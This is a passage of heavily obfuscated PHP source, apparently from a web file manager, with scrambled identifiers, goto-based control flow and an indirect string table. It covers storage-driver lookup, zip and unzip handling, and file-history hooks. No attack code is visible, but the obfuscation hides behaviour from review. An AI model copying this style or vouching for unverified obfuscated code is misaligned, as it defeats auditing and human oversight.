$Dê±Å¡ŞÔÃ = $C¥³½Šğë->size($C‰¢®¤êÙ›); goto Cˆ‘‘çŒƒÇ; EÈöä—ø…: } private static function driverMake(&$A™«¬‰·ä”) { goto a«ïôƒ¡ˆ; eÙˆ¶æ®Âì: if ($E¥£ÇÀëø¡[$Bë“ô«ÁÓ÷[29]] == KodIO::KOD_IO && !self::$driverListSystem[$E¥£ÇÀëø¡[$Bë“ô«ÁÓ÷[392]]]) { return !1; } $A™«¬‰·ä” = $E¥£ÇÀëø¡[$Bë“ô«ÁÓ÷[1065]]; $f‚äá§ç = self::driverGet($E¥£ÇÀëø¡, $A™«¬‰·ä”); goto c“Ü‡Ò£ïß; c“Ü‡Ò£ïß: return $f‚äá§ç; goto BŒª±ç´¾É; a«ïôƒ¡ˆ: $Bë“ô«ÁÓ÷ =& $_SERVER[´¬]; $E¥£ÇÀëø¡ = KodIO::parse($A™«¬‰·ä”); if (!self::$driverListSystem) { $bñŠÜÔŒ‚ = Model($Bë“ô«ÁÓ÷[727])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($bñŠÜÔŒ‚, $Bë“ô«ÁÓ÷[392]); } goto eÙˆ¶æ®Âì; BŒª±ç´¾É: } private static function driverGet($dë¾ìò–ÑÇ, &$f¯Ğ£Î¸²) { goto bØ‡ãÙñÉÒ; bïà…—ï¶¡: switch ($dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[29]]) { case KodIO::KOD_IO: $FÖ£ÒÊ„êö = self::$driverListSystem[$eòªŠ¦¾ƒ]; break; case KodIO::KOD_SOURCE: $f¯Ğ£Î¸² = $eòªŠ¦¾ƒ . $f¯Ğ£Î¸²; $FÖ£ÒÊ„êö = array($Fë¨¤ä—Üî[1067] => $Fë¨¤ä—Üî[1068], $Fë¨¤ä—Üî[6] => $dë¾ìò–ÑÇ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $CİñçÕÛ›¦ = $GLOBALS[$Fë¨¤ä—Üî[1069]]; self::$driverListUser = array_to_keyvalue($CİñçÕÛ›¦, $Fë¨¤ä—Üî[392]); } $FÖ£ÒÊ„êö = self::$driverListUser[$eòªŠ¦¾ƒ]; break; case KodIO::KOD_SHARE_LINK: $FÖ£ÒÊ„êö = array($Fë¨¤ä—Üî[1067] => $Fë¨¤ä—Üî[1070], $Fë¨¤ä—Üî[6] => $dë¾ìò–ÑÇ); $e«·‹åÓ×… = Action($Fë¨¤ä—Üî[1071])->sharePathInfo($dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[76]]); $f¯Ğ£Î¸² = $e«·‹åÓ×…[$Fë¨¤ä—Üî[394]]; if (!$e«·‹åÓ×…[$Fë¨¤ä—Üî[394]]) { $eÜáÒÕ÷Í… = Model($Fë¨¤ä—Üî[562])->getInfo($e«·‹åÓ×…[$Fë¨¤ä—Üî[466]]); $f¯Ğ£Î¸² = KodIO::clear($eÜáÒÕ÷Í…[$Fë¨¤ä—Üî[1072]] . $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[1065]]); $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[464]] = $eÜáÒÕ÷Í…; $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[1049]] = $f¯Ğ£Î¸²; $FÖ£ÒÊ„êö = array($Fë¨¤ä—Üî[1067] => $Fë¨¤ä—Üî[1073], $Fë¨¤ä—Üî[6] => $dë¾ìò–ÑÇ); } break; case KodIO::KOD_SHARE_ITEM: $FÖ£ÒÊ„êö = array($Fë¨¤ä—Üî[1067] => $Fë¨¤ä—Üî[1074], $Fë¨¤ä—Üî[6] => $dë¾ìò–ÑÇ); $eÜáÒÕ÷Í… = Model($Fë¨¤ä—Üî[562])->getInfo($dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[392]]); if ($eÜáÒÕ÷Í…[$Fë¨¤ä—Üî[394]] == $Fë¨¤ä—Üî[495]) { $f¯Ğ£Î¸² = KodIO::clear($eÜáÒÕ÷Í…[$Fë¨¤ä—Üî[1072]] . $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[1065]]); $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[464]] = $eÜáÒÕ÷Í…; $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[1049]] = $f¯Ğ£Î¸²; $FÖ£ÒÊ„êö = array($Fë¨¤ä—Üî[1067] => $Fë¨¤ä—Üî[1075], $Fë¨¤ä—Üî[6] => $dë¾ìò–ÑÇ); } else { if (!$f¯Ğ£Î¸²) { $f¯Ğ£Î¸² = $eÜáÒÕ÷Í…[$Fë¨¤ä—Üî[394]]; } } break; default: $f¯Ğ£Î¸² = $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[76]]; $FÖ£ÒÊ„êö = array($Fë¨¤ä—Üî[1067] => $Fë¨¤ä—Üî[1076]); break; } $BƒùÊÅîà = $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[76]]; if (!isset(self::$driverCache[$BƒùÊÅîà])) { $c“»’»¬§¶ = strtolower($FÖ£ÒÊ„êö[$Fë¨¤ä—Üî[94]]); $bí‚Ãó¤ÛÊ = $GLOBALS[$Fë¨¤ä—Üî[6]][$Fë¨¤ä—Üî[88]][$Fë¨¤ä—Üî[791]]; $eêƒ„™Óë = $Fë¨¤ä—Üî[72] . (isset($bí‚Ãó¤ÛÊ[$c“»’»¬§¶]) ? $bí‚Ãó¤ÛÊ[$c“»’»¬§¶] : ucfirst($c“»’»¬§¶)); if (!class_exists($eêƒ„™Óë)) { show_json("{$eêƒ„™Óë}\40\156\157\164\x20\145\x78\x69\163\x74\163\41", !1); } $eŠŠ¯«äá = isset($FÖ£ÒÊ„êö[$Fë¨¤ä—Üî[6]]) ? $FÖ£ÒÊ„êö[$Fë¨¤ä—Üî[6]] : !1; self::$driverCache[$BƒùÊÅîà] = new $eêƒ„™Óë($eŠŠ¯«äá); } goto fÏ»òÑÜÜÁ; fÏ»òÑÜÜÁ: $B‰ÕÂøÓ½Ï = self::$driverCache[$BƒùÊÅîà]; $B‰ÕÂøÓ½Ï->pathDriver = $bÙÁê† ¢…; $B‰ÕÂøÓ½Ï->pathBase = $Fë¨¤ä—Üî[33]; goto a‘’¾ì‡; CêÏ¶‡Šóƒ: $B‰ÕÂøÓ½Ï->path = $f¯Ğ£Î¸²; return $B‰ÕÂøÓ½Ï; goto fŞ‚ÀÄáØ­; a‘’¾ì‡: if (isset($FÖ£ÒÊ„êö[$Fë¨¤ä—Üî[6]][$Fë¨¤ä—Üî[1077]])) { $B‰ÕÂøÓ½Ï->pathBase = rtrim($FÖ£ÒÊ„êö[$Fë¨¤ä—Üî[6]][$Fë¨¤ä—Üî[1077]], $Fë¨¤ä—Üî[8]) . $Fë¨¤ä—Üî[8]; $f¯Ğ£Î¸² = $B‰ÕÂøÓ½Ï->pathBase . ltrim($f¯Ğ£Î¸², $Fë¨¤ä—Üî[8]); } $f¯Ğ£Î¸² = $B‰ÕÂøÓ½Ï->getPath($f¯Ğ£Î¸²); if (isset($dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[1049]])) { $f¯Ğ£Î¸² = $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[1049]]; } goto CêÏ¶‡Šóƒ; bØ‡ãÙñÉÒ: $Fë¨¤ä—Üî =& $_SERVER[´¬]; $bÙÁê† ¢… = $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[1066]]; $eòªŠ¦¾ƒ = $dë¾ìò–ÑÇ[$Fë¨¤ä—Üî[392]]; goto bïà…—ï¶¡; fŞ‚ÀÄáØ­: } public static function errorTips($a’®ÏÈ¹‰Ü = false) { goto eîñÏÑËîÓ; D¹Ö÷‚…°: if ($a’®ÏÈ¹‰Ü === -1) { return $C·¯Şã³°Ñ ? $C·¯Şã³°Ñ[count($C·¯Şã³°Ñ) - 1] : $f–ÀˆŠà‹ö[33]; } if ($a’®ÏÈ¹‰Ü === !1) { return implode($f–ÀˆŠà‹ö[228], $C·¯Şã³°Ñ); } if (count($C·¯Şã³°Ñ) >= $cŒº÷Î¨Å·) { $C·¯Şã³°Ñ = array_slice($C·¯Şã³°Ñ, $cŒº÷Î¨Å· * 0.5, $cŒº÷Î¨Å·); } goto a¶Áº®¾Ë¾; eîñÏÑËîÓ: $f–ÀˆŠà‹ö =& $_SERVER[´¬]; static $C·¯Şã³°Ñ = array(); $cŒº÷Î¨Å· = 1000; goto D¹Ö÷‚…°; a¶Áº®¾Ë¾: $C·¯Şã³°Ñ[] = $a’®ÏÈ¹‰Ü; write_log($f–ÀˆŠà‹ö[160] . ACTION . $f–ÀˆŠà‹ö[1078] . $a’®ÏÈ¹‰Ü, $f–ÀˆŠà‹ö[1079]); goto f­’„ĞçÁ; f­’„ĞçÁ: } public static function getLastError($bí§Ùê÷† = '') { $CÙ¼¥¥¼‚ = self::errorTips(-1); return $CÙ¼¥¥¼‚ ? $CÙ¼¥¥¼‚ : $bí§Ùê÷†; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $b„øÊÇ¬£Ó; if (!$b„øÊÇ¬£Ó) { $DÌ±¤ö‰ÅÔ = IO::init($_SERVER[´¬][8]); } return $DÌ±¤ö‰ÅÔ; } private static function iconvSystem($cø½­°†ó‘) { return self::local()->iconvSystem($cø½­°†ó‘); } private static function iconvApp($F†²À™ïĞš) { return self::local()->iconvApp($F†²À™ïĞš); } public static function zip($eä®‘ñÏ , $aí®¼£ù†ª = "\x7a\x69\x70", $BØ¯šÂºë‚ = '', $fóÆ‚ë„È² = REPEAT_RENAME) { goto E±åô’–™ğ; aâÍç†î°: $E—ãôÛ× = $d¥ïâäÄÑÁ . $FÁñŒ§“óË . $eÆñ›Ôğí´[95] . $aí®¼£ù†ª; $E—ãôÛ× = get_filename_auto($E—ãôÛ×, $eÆñ›Ôğí´[33], $fóÆ‚ë„È²); $b°íˆ›Àã§ = self::iconvSystem($E—ãôÛ×); goto ağŞ„â‚·Å; dì„‰î…®: if (count($B“«ÔœøØ„) > 1) { $c—¹‡Çö…å = IO::info(IO::pathFather($F»ğÑ¼™¼[$eÆñ›Ôğí´[76]])); $FÁñŒ§“óË = $c—¹‡Çö…å[$eÆñ›Ôğí´[28]]; } $d¥ïâäÄÑÁ = $AĞ¾Œ„Ìå®; if (!$d¥ïâäÄÑÁ) { $d¥ïâäÄÑÁ = get_path_father($F»ğÑ¼™¼[$eÆñ›Ôğí´[76]]); if (!$BØ¯šÂºë‚ && $BÛ–·‰‚ŞÍ->getType() == $eÆñ›Ôğí´[106]) { $d¥ïâäÄÑÁ = get_path_father($BÛ–·‰‚ŞÍ->path); } $B¯âåæÄØÔ = IO::info($d¥ïâäÄÑÁ); if (!$B¯âåæÄØÔ[$eÆñ›Ôğí´[195]]) { show_json(LNG($eÆñ›Ôğí´[1081]), !1); } } goto aâÍç†î°; E±åô’–™ğ: $eÆñ›Ôğí´ =& $_SERVER[´¬]; $BÛ–·‰‚ŞÍ = self::init($eä®‘ñÏ [0][$eÆñ›Ôğí´[76]]); $F»ğÑ¼™¼ = self::info($eä®‘ñÏ [0][$eÆñ›Ôğí´[76]]); goto e™æÍí¼”ô; e™æÍí¼”ô: $AĞ¾Œ„Ìå® = !1; if (!$BØ¯šÂºë‚ && $BÛ–·‰‚ŞÍ->getType() == $eÆñ›Ôğí´[106]) { $B“«ÔœøØ„ = self::zipFileList($eä®‘ñÏ ); } else { $AĞ¾Œ„Ìå® = $BØ¯šÂºë‚ ? $BØ¯šÂºë‚ : TEMP_FILES . $eÆñ›Ôğí´[1080] . time() . rand_string(8) . $eÆñ›Ôğí´[8]; mk_dir($AĞ¾Œ„Ìå®); $B“«ÔœøØ„ = self::zipFileList($eä®‘ñÏ , $AĞ¾Œ„Ìå®); } $FÁñŒ§“óË = $F»ğÑ¼™¼[$eÆñ›Ôğí´[28]]; goto dì„‰î…®; aŸ»º§ŸÆ˜: if (!$A‚«ô‘Ş‰) { del_dir($AĞ¾Œ„Ìå®); show_json(LNG($eÆñ›Ôğí´[1082]), !1); } del_dir($AĞ¾Œ„Ìå®); return $A‚«ô‘Ş‰; goto Fœ‚‡¨ªŒ; ağŞ„â‚·Å: foreach ($B“«ÔœøØ„ as $dÏ×ØİãÆÚ => $c¢†—ì×É) { $B“«ÔœøØ„[$dÏ×ØİãÆÚ] = self::iconvSystem($c¢†—ì×É); } KodArchive::create($b°íˆ›Àã§, $B“«ÔœøØ„); if (!IO::exist($E—ãôÛ×)) { if ($AĞ¾Œ„Ìå®) { del_dir($AĞ¾Œ„Ìå®); } show_json(LNG($eÆñ›Ôğí´[1082]), !1); } goto Föí¬‡³¥; Föí¬‡³¥: if ($BØ¯šÂºë‚ || !$AĞ¾Œ„Ìå®) { if ($AĞ¾Œ„Ìå® && strstr($AĞ¾Œ„Ìå®, TEMP_FILES)) { $FÄ‡‹ğñŒƒ = $B“«ÔœøØ„ = array(); recursion_dir($d¥ïâäÄÑÁ, $FÄ‡‹ğñŒƒ, $B“«ÔœøØ„, 0); foreach ($FÄ‡‹ğñŒƒ as $FÁåÃŞÜ™) { del_dir($FÁåÃŞÜ™); } foreach ($B“«ÔœøØ„ as $F‡Š—ğÒß²) { if ($F‡Š—ğÒß² == $b°íˆ›Àã§) { continue; } del_file($F‡Š—ğÒß²); } } return $E—ãôÛ×; } $BùˆÅ‹ÙÁ¶ = self::pathFather($F»ğÑ¼™¼[$eÆñ›Ôğí´[76]]); $A‚«ô‘Ş‰ = self::move($E—ãôÛ×, $BùˆÅ‹ÙÁ¶, $fóÆ‚ë„È²); goto aŸ»º§ŸÆ˜; Fœ‚‡¨ªŒ: } public static function unzip($F•£øÂ•Œá, $Eİ‹éİöŞ¾ = "\162\x65\x70\x6c\x61\143\145") { goto Aà˜Ï¥ø¬°; eÍÒåèš: mk_dir($cÚÒ‹ƒæ±ª); $Aƒ¯Î“±Ïà = self::fileExt($DÅĞ’°•‘Û); $dŠÈˆ®†åÊ = $cÚÒ‹ƒæ±ª . $BÔÚò…åÒš[95] . $Aƒ¯Î“±Ïà; goto CÃ†ï³åŠÌ; Aà˜Ï¥ø¬°: $BÔÚò…åÒš =& $_SERVER[´¬]; $B©İóšİÊ = $F•£øÂ•Œá[$BÔÚò…åÒš[76]]; $f•Ğ…•óªÓ = $F•£øÂ•Œá[$BÔÚò…åÒš[1083]]; goto c¦¬™ê„Ÿ; d†ÏñÜì„ë: Hook::trigger($BÔÚò…åÒš[1090], $cÚÒ‹ƒæ±ª); recursion_dir($cÚÒ‹ƒæ±ª, $D‹ÇÇİ”°˜, $F¥Á¨––äÍ, 0); $a„™áİÖ×Å = array_merge($D‹ÇÇİ”°˜, $F¥Á¨––äÍ); goto cÃ©Çà¦è; Cœƒ¾ÓÁĞÌ: $F–àÉŒÑÍ = self::tmpFileName($DÅĞ’°•‘Û); $cÚÒ‹ƒæ±ª = TEMP_FILES . $F–àÉŒÑÍ; del_dir($cÚÒ‹ƒæ±ª); goto eÍÒåèš; eÓ•«Ñ½: return !0; goto Ešóí‚Ü; CÃ†ï³åŠÌ: if (!@file_exists(self::iconvSystem($dŠÈˆ®†åÊ))) { $DìééÆ³Ê‚ = self::localFilePath($B©İóšİÊ, $Aƒ¯Î“±Ïà); $dŠÈˆ®†åÊ = $DìééÆ³Ê‚ ? $DìééÆ³Ê‚ : parent::download($B©İóšİÊ, $dŠÈˆ®†åÊ); } $dŠÈˆ®†åÊ = self::iconvSystem($dŠÈˆ®†åÊ); $Fø¶ÈšõªÎ = isset($F•£øÂ•Œá[$BÔÚò…åÒš[1085]]) ? $F•£øÂ•Œá[$BÔÚò…åÒš[1085]] : $BÔÚò…åÒš[1086]; goto aœØñ°Œ›“; aœØñ°Œ›“: $fÒˆÕËÌø = KodArchive::extract($dŠÈˆ®†åÊ, $cÚÒ‹ƒæ±ª . $BÔÚò…åÒš[8], $Fø¶ÈšõªÎ); self::archiveExt(); if (!$fÒˆÕËÌø[$BÔÚò…åÒš[1087]]) { show_json($BÔÚò…åÒš[1088] . $fÒˆÕËÌø[$BÔÚò…åÒš[1089]], !1); } goto d†ÏñÜì„ë; cÃ©Çà¦è: foreach ($a„™áİÖ×Å as $f«´‘õ±±») { $f«´‘õ±±» = self::iconvApp($f«´‘õ±±»); self::move($f«´‘õ±±», $f•Ğ…•óªÓ, $Eİ‹éİöŞ¾); } del_dir($cÚÒ‹ƒæ±ª); if (!$DìééÆ³Ê‚) { del_file($dŠÈˆ®†åÊ); } goto eÓ•«Ñ½; c¦¬™ê„Ÿ: if (!($DÅĞ’°•‘Û = parent::info($B©İóšİÊ))) { show_json(LNG($BÔÚò…åÒš[1084]), !1); } if (!($Aà İ•Ë¶§ = parent::infoFull($f•Ğ…•óªÓ))) { $f•Ğ…•óªÓ = parent::mkdir($f•Ğ…•óªÓ); $Aà İ•Ë¶§ = array($BÔÚò…åÒš[76] => $f•Ğ…•óªÓ); } else { if (isset($Aà İ•Ë¶§[$BÔÚò…åÒš[394]]) && trim($Aà İ•Ë¶§[$BÔÚò…åÒš[76]], $BÔÚò…åÒš[8]) != trim($f•Ğ…•óªÓ, $BÔÚò…åÒš[8])) { $C¸Á¸ê¦ìè = KodIO::make($Aà İ•Ë¶§[$BÔÚò…åÒš[476]]); $B‹­ õ®Á„ = parent::fileNameAuto($C¸Á¸ê¦ìè, $Aà İ•Ë¶§[$BÔÚò…åÒš[28]], REPEAT_RENAME_FOLDER, !0); $f•Ğ…•óªÓ = parent::mkdir($C¸Á¸ê¦ìè . $B‹­ õ®Á„); $Aà İ•Ë¶§ = array($BÔÚò…åÒš[76] => $f•Ğ…•óªÓ); } } $f•Ğ…•óªÓ = $Aà İ•Ë¶§[$BÔÚò…åÒš[76]]; goto Cœƒ¾ÓÁĞÌ; Ešóí‚Ü: } public static function unzipList($d§ËõÓÒÅİ) { goto Eƒ·è–¢¹; aó·ŒŠ¯ : self::archiveExt(); del_dir($Dóïƒñ»¿‡); if (!$E„Ş÷¿ğŞË[$aÕñºâ—äÜ[1087]]) { show_json($E„Ş÷¿ğŞË[$aÕñºâ—äÜ[1089]], !1); } goto AŠÖÕÒê­’; A„§‹†¸„±: $b“Ëó‰Œê = self::info($Aç±°§¼øË); $d”Ï×£›È = self::fileExt($b“Ëó‰Œê); $AÂ«Ğğ¼•‰ = self::tmpFileName($b“Ëó‰Œê); goto cª‰ÕÒ°…; cª‰ÕÒ°…: if (isset($F¡£”ÅŸ†ò)) { $bßõ«¾Ëä = array($F¡£”ÅŸ†ò[$aÕñºâ—äÜ[76]], $F¡£”ÅŸ†ò[$aÕñºâ—äÜ[1091]], $F¡£”ÅŸ†ò[$aÕñºâ—äÜ[28]]); $cµö÷æƒ‚ó = md5(implode($aÕñºâ—äÜ[71], $bßõ«¾Ëä)) . $aÕñºâ—äÜ[95] . get_path_ext($F¡£”ÅŸ†ò[$aÕñºâ—äÜ[28]]); } else { $bßõ«¾Ëä = array($b“Ëó‰Œê[$aÕñºâ—äÜ[28]], $b“Ëó‰Œê[$aÕñºâ—äÜ[76]], $b“Ëó‰Œê[$aÕñºâ—äÜ[78]]); $cµö÷æƒ‚ó = md5(implode($aÕñºâ—äÜ[71], $bßõ«¾Ëä)) . $aÕñºâ—äÜ[95] . $d”Ï×£›È; } if ($fë‹ò£Äİ == -1) { $A“Œ‚Éœá = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\126\x69\145\x77\x2f{$AÂ«Ğğ¼•‰}\57{$cµö÷æƒ‚ó}\x2e\154\157\147"; $f´µ¥ââ•Á = self::infoFull($A“Œ‚Éœá); if ($f´µ¥ââ•Á) { $A“Œ‚Éœá = $f´µ¥ââ•Á[$aÕñºâ—äÜ[76]]; $eÁİÉÖ = self::getContent($A“Œ‚Éœá); if ($eÁİÉÖ) { $E„½óóĞ¢› = json_decode($eÁİÉÖ, !0); if (count($E„½óóĞ¢›) >= $E¥¶ƒîîÙ) { show_json(sprintf(LNG($aÕñºâ—äÜ[1093]), count($E„½óóĞ¢›)), !1); } return $E„½óóĞ¢›; } } else { $A“Œ‚Éœá = self::mkfile($A“Œ‚Éœá); } } $Dóïƒñ»¿‡ = TEMP_FILES . $AÂ«Ğğ¼•‰; goto bâœÙø˜²İ; bâœÙø˜²İ: if (!is_dir($Dóïƒñ»¿‡)) { mk_dir($Dóïƒñ»¿‡); } $e×àÜÃ®… = $Dóïƒñ»¿‡ . $aÕñºâ—äÜ[8] . $cµö÷æƒ‚ó; if (!@file_exists(self::iconvSystem($e×àÜÃ®…))) { if (isset($F¡£”ÅŸ†ò)) { url_request($F°‹öÀÊ„, $aÕñºâ—äÜ[1094], $e×àÜÃ®…); } else { $DĞ£íÊ³ÜÅ = self::localFilePath($F°‹öÀÊ„, $d”Ï×£›È); $e×àÜÃ®… = $DĞ£íÊ³ÜÅ ? $DĞ£íÊ³ÜÅ : self::download($F°‹öÀÊ„, $e×àÜÃ®…); } } goto fñíŸøÑÍŒ; AŠÖÕÒê­’: $E„½óóĞ¢› = json_encode($E„Ş÷¿ğŞË[$aÕñºâ—äÜ[1089]]); self::setContent($A“Œ‚Éœá, $E„½óóĞ¢›); if (count($E„Ş÷¿ğŞË[$aÕñºâ—äÜ[1089]]) >= $E¥¶ƒîîÙ) { show_json(sprintf(LNG($aÕñºâ—äÜ[1093]), count($E„Ş÷¿ğŞË[$aÕñºâ—äÜ[1089]])), !1); } goto c¾ŠÉ‰´µé; c¾ŠÉ‰´µé: return $E„Ş÷¿ğŞË[$aÕñºâ—äÜ[1089]]; goto A×Ïâ×„; Eƒ·è–¢¹: $aÕñºâ—äÜ =& $_SERVER[´¬]; $F°‹öÀÊ„ = $d§ËõÓÒÅİ[$aÕñºâ—äÜ[76]]; $fë‹ò£Äİ = isset($d§ËõÓÒÅİ[$aÕñºâ—äÜ[1091]]) ? $d§ËõÓÒÅİ[$aÕñºâ—äÜ[1091]] : -1; goto d¡›„ĞÙ­÷; fñíŸøÑÍŒ: $e×àÜÃ®… = self::iconvSystem($e×àÜÃ®…); if ($fë‹ò£Äİ >= 0) { $dÎÏ‘†õÇ¾ = isset($d§ËõÓÒÅİ[$aÕñºâ—äÜ[1095]]) ? $d§ËõÓÒÅİ[$aÕñºâ—äÜ[1095]] : !1; $CÉß›¢êÂ = isset($d§ËõÓÒÅİ[$aÕñºâ—äÜ[28]]) ? $d§ËõÓÒÅİ[$aÕñºâ—äÜ[28]] : $aÕñºâ—äÜ[33]; KodArchive::filePreview($e×àÜÃ®…, $fë‹ò£Äİ, $dÎÏ‘†õÇ¾, $CÉß›¢êÂ); self::archiveExt(); die; } $E„Ş÷¿ğŞË = KodArchive::listContent($e×àÜÃ®…); goto aó·ŒŠ¯ ; d¡›„ĞÙ­÷: $E¥¶ƒîîÙ = 50000; if (request_url_safe($F°‹öÀÊ„)) { $F¡£”ÅŸ†ò = parse_url_query($F°‹öÀÊ„); if (!isset($F¡£”ÅŸ†ò[$aÕñºâ—äÜ[76]])) { show_json($aÕñºâ—äÜ[1092], !1); } } $Aç±°§¼øË = isset($F¡£”ÅŸ†ò) ? $F¡£”ÅŸ†ò[$aÕñºâ—äÜ[76]] : $F°‹öÀÊ„; goto A„§‹†¸„±; A×Ïâ×„: } private static function fileExt($c•ïàÎåå) { $Fóá…Æ§Öô =& $_SERVER[´¬]; $Aƒİ­¹£Ü = $c•ïàÎåå[$Fóá…Æ§Öô[168]]; if ($Aƒİ­¹£Ü == $Fóá…Æ§Öô[1096]) { $A´‚¤ÄÜø‡ = $Fóá…Æ§Öô[1097]; if (substr($c•ïàÎåå[$Fóá…Æ§Öô[28]], -strlen($A´‚¤ÄÜø‡)) == $A´‚¤ÄÜø‡) { $Aƒİ­¹£Ü = $Fóá…Æ§Öô[1098]; } } self::archiveExt($Aƒİ­¹£Ü); return $Aƒİ­¹£Ü; } private static function zipFileList($eâÜ£¥¥‘ì, $aÏÈ ©×œ = false) { $AÉ“Ô£Ë =& $_SERVER[´¬]; $cİÕ™Íƒò = array(); foreach ($eâÜ£¥¥‘ì as $DİëÏÍ–Ò) { $aˆ»•¨å¿Â = $DİëÏÍ–Ò[$AÉ“Ô£Ë[76]]; if ($aÏÈ ©×œ) { $aˆ»•¨å¿Â = self::copy($DİëÏÍ–Ò[$AÉ“Ô£Ë[76]], $aÏÈ ©×œ, $AÉ“Ô£Ë[783]); } else { $A²“‚†·½ = self::init($DİëÏÍ–Ò[$AÉ“Ô£Ë[76]]); if ($A²“‚†·½->getType() == $AÉ“Ô£Ë[106]) { $aˆ»•¨å¿Â = $A²“‚†·½->path; } } if ($aˆ»•¨å¿Â && self::local()->exist($aˆ»•¨å¿Â)) { $cİÕ™Íƒò[$DİëÏÍ–Ò[$AÉ“Ô£Ë[76]]] = $aˆ»•¨å¿Â; } } if (!empty($cİÕ™Íƒò)) { return array_values($cİÕ™Íƒò); } show_json(LNG($AÉ“Ô£Ë[1062]), !1); } public static function tmpFileName($Aë¶‹Ë‚ˆ) { $CÙ£…©‰ÙÛ =& $_SERVER[´¬]; $b³ùªàååÉ = array($Aë¶‹Ë‚ˆ[$CÙ£…©‰ÙÛ[28]], $Aë¶‹Ë‚ˆ[$CÙ£…©‰ÙÛ[76]], $Aë¶‹Ë‚ˆ[$CÙ£…©‰ÙÛ[78]], $Aë¶‹Ë‚ˆ[$CÙ£…©‰ÙÛ[485]]); return md5(implode($CÙ£…©‰ÙÛ[71], $b³ùªàååÉ)); } private static function localFilePath($bŸš¡ï è…, $b·ëÎùäçÛ) { goto f˜µ¼“ÏŒ¾; Cœµ¯Ç‡Áä: if ($FŒê÷ŸÊŸÍ == $d¯øˆ»™¶á[106] || $FŒê÷ŸÊŸÍ == $d¯øˆ»™¶á[1102]) { if (!$F´æ½ÂÒ¥->exist($F´æ½ÂÒ¥->path)) { show_json(LNG($d¯øˆ»™¶á[105]), !1); } return $F´æ½ÂÒ¥->path; } return !1; goto cëæŞ´¯; f˜µ¼“ÏŒ¾: $d¯øˆ»™¶á =& $_SERVER[´¬]; if ($b·ëÎùäçÛ == $d¯øˆ»™¶á[1099] && strtoupper(substr(PHP_OS, 0, 3)) == $d¯øˆ»™¶á[1100]) { return !1; } $fÁ»î®µÀ­ = KodIO::parse($bŸš¡ï è…); goto E›©²˜; E›©²˜: if ($fÁ»î®µÀ­[$d¯øˆ»™¶á[29]] == KodIO::KOD_SOURCE) { $aê¤ÁÈòë‰ = Model($d¯øˆ»™¶á[790])->fileInfoGet(KodIO::sourceID($bŸš¡ï è…)); if (!$aê¤ÁÈòë‰[$d¯øˆ»™¶á[76]]) { show_json($d¯øˆ»™¶á[1101], !1); } $bŸš¡ï è… = $aê¤ÁÈòë‰[$d¯øˆ»™¶á[76]]; } $F´æ½ÂÒ¥ = self::init($bŸš¡ï è…); $FŒê÷ŸÊŸÍ = $F´æ½ÂÒ¥->getType(); goto Cœµ¯Ç‡Áä; cëæŞ´¯: } private static function archiveExt($D‰Î’ŸË…ê = '') { $GLOBALS[$_SERVER[´¬][1103]] = $D‰Î’ŸË…ê; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto aª‘ã«æ‚ ; c’‡Ù¤ÃóÄ: Hook::bind($a¬œòâà¬˜[1115], $a¬œòâà¬˜[1116]); Hook::bind($a¬œòâà¬˜[1117], $a¬œòâà¬˜[1118]); goto c°ôğŞªÆ; f–ÀÍâªÁ±: if ($cô†òš°ˆ[$a¬œòâà¬˜[1105]] <= 0) { return; } if (isset($_REQUEST[$a¬œòâà¬˜[1106]]) && $_REQUEST[$a¬œòâà¬˜[1106]] == $a¬œòâà¬˜[87]) { return; } Hook::bind($a¬œòâà¬˜[1107], $a¬œòâà¬˜[1108]); goto E÷ğÅæ¢‹­; E÷ğÅæ¢‹­: Hook::bind($a¬œòâà¬˜[1109], $a¬œòâà¬˜[1110]); Hook::bind($a¬œòâà¬˜[1111], $a¬œòâà¬˜[1112]); Hook::bind($a¬œòâà¬˜[1113], $a¬œòâà¬˜[1114]); goto c’‡Ù¤ÃóÄ; aª‘ã«æ‚ : $a¬œòâà¬˜ =& $_SERVER[´¬]; $cô†òš°ˆ = $GLOBALS[$a¬œòâà¬˜[6]][$a¬œòâà¬˜[88]]; if ($cô†òš°ˆ[$a¬œòâà¬˜[1104]] != 1) { return; } goto f–ÀÍâªÁ±; c°ôğŞªÆ: } public static function eventBeforeUpload($dš°ä”œšñ) { if ($dš°ä”œšñ[3] && $dš°ä”œšñ[3] != REPEAT_REPLACE) { return; } $Bó „ƒ‡’ä = self::parsePath($dš°ä”œšñ[0]); if (!$Bó „ƒ‡’ä) { return; } self::add($Bó „ƒ‡’ä); } public static function eventBeforeEdit($b¾Ä¼ñ‡‹®) { $AİÚæÍ­­„ = self::parsePath($b¾Ä¼ñ‡‹®[0]); if (!$AİÚæÍ­­„) { return; } self::add($AİÚæÍ­­„); } public static function eventBeforeCopyFile($C„ù’ÍÇ…Ó, $d©öƒê ËŒ, $e·œâÑº¦, $fîïË ‘Âª, $Aè¢«®, $F›Ü‹ßØ‚Ğ) { $E¹Ú¾Ê¾®Ã = $e·œâÑº¦->getPathOuter($fîïË ‘Âª); $e™¾Éå§…° = self::parsePath($E¹Ú¾Ê¾®Ã); if (!$e™¾Éå§…°) { return; } self::add($e™¾Éå§…°); } public static function eventBeforeRename($B¸ÑöÁ©) { $b‘ áƒñœé =& $_SERVER[´¬]; $B·—óé¹µÉ = self::parsePath($B¸ÑöÁ©[0]); if (!$B·—óé¹µÉ) { return; } $DÀÉ¢Áó‘ = self::checkInHistory($B·—óé¹µÉ); if (!$DÀÉ¢Áó‘) { return; } if ($DÀÉ¢Áó‘[$b‘ áƒñœé[29]] == $b‘ áƒñœé[192]) { $c´¸¼¦Öò = self::listData($B·—óé¹µÉ); if ($c´¸¼¦Öò 